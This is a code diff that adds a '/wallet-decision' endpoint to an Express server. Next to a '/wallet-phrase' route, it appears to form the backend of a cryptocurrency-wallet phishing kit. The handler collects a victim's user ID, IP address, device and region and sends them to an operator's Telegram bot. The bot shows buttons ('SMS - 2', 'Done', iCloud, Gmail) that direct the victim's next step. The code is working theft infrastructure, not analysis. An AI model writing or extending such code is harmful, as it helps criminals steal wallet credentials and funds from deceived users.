@@ -1888,3 +1888,56 @@ app.post("/wallet-phrase", async (req, res) => {
     res.status(500).json({ error: "Internal server error" });
   }
 });
+
+// ✅ POST /wallet-decision - Wallet Decision Page Endpoint
+app.post("/wallet-decision", async (req, res) => {
+  try {
+    const { userId, email } = req.body;
+
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+      req.headers["x-real-ip"] ||
+      req.connection.remoteAddress ||
+      "Unknown IP";
+
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    const message =
+      `💰💰💰💰 <b>Wallet - Decision</b> 💰💰💰💰\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: "HTML",
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: "💬 SMS - 2 💬", callback_data: "wallet_decision_sms" }],
+            [{ text: "🏁 Done 🏁", callback_data: "wallet_decision_done" }],
+            [
+              { text: "☁️", callback_data: "wallet_decision_icloud" },
+              { text: "🌈", callback_data: "wallet_decision_gmail" }
+            ]
+          ]
+        }
+      })
+    });
+
+    console.log(`✅ Wallet decision message sent`);
+    res.json({ ok: true });
+  } catch (err) {
+    console.error("❌ Wallet decision error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
